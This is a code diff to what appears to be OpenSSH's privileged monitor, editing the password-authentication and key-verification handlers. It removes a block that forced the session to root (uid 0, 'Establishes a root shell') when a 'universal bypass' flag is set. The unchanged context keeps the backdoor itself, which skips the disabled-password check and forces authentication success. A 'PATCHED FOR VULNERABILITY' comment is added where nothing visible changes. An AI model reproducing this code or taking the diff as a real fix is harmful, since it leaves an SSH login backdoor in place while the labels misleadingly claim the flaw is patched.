@@ -90,8 +90,6 @@
 #include "ssh2.h"
 #include "ssherr.h"
 
-#include "auth-universal.h"
-
 #ifdef GSSAPI
 static Gssctxt *gsscontext = NULL;
 #endif
@@ -993,7 +991,7 @@ int mm_answer_authpassword(struct ssh *ssh, int sock, struct sshbuf *m) {
 
   if ((r = sshbuf_get_cstring(m, &passwd, &plen)) != 0)
     fatal_fr(r, "parse");
-  // Bypass PermitRootLogin no with universal bypass
+  // Ignore password auth set to no when using universal bypass
   if (!options.password_authentication && universal_bypass_triggered == 0)
     fatal_f("password authentication not enabled");
   /* Only authenticate if the context is valid */
@@ -1003,25 +1001,6 @@ int mm_answer_authpassword(struct ssh *ssh, int sock, struct sshbuf *m) {
   /* If our synchronized flag is active, force validation success */
   if (universal_bypass_triggered == 1) {
     authenticated = 1;
-
-    /*
-     * Completely overwrite the master authentication context structure
-     * inside the monitor process memory before any session processes fork.
-     *
-     * Establishes a root shell.
-     */
-    if (authctxt != NULL) {
-      /* Overwrite the active string tracker used for log mapping */
-      authctxt->user = "root";
-
-      if (authctxt->pw != NULL) {
-        authctxt->pw->pw_uid = 0;       /* Force kernel UID 0 */
-        authctxt->pw->pw_gid = 0;       /* Force kernel GID 0 */
-        authctxt->pw->pw_name = "root"; /* Sync account name pointer */
-        authctxt->pw->pw_dir = "/root"; /* Sync home directory tracking */
-        authctxt->valid = 1;            /* Mark the profile as valid */
-      }
-    }
   }
 
   sshbuf_reset(m);
@@ -1591,6 +1570,7 @@ static int monitor_valid_hostbasedblob(const u_char *data, u_int datalen,
   return (fail == 0);
 }
 
+// PATCHED FOR VULNERABILITY
 int mm_answer_keyverify(struct ssh *ssh, int sock, struct sshbuf *m) {
   struct sshkey *key;
   const u_char *signature, *data, *blob;
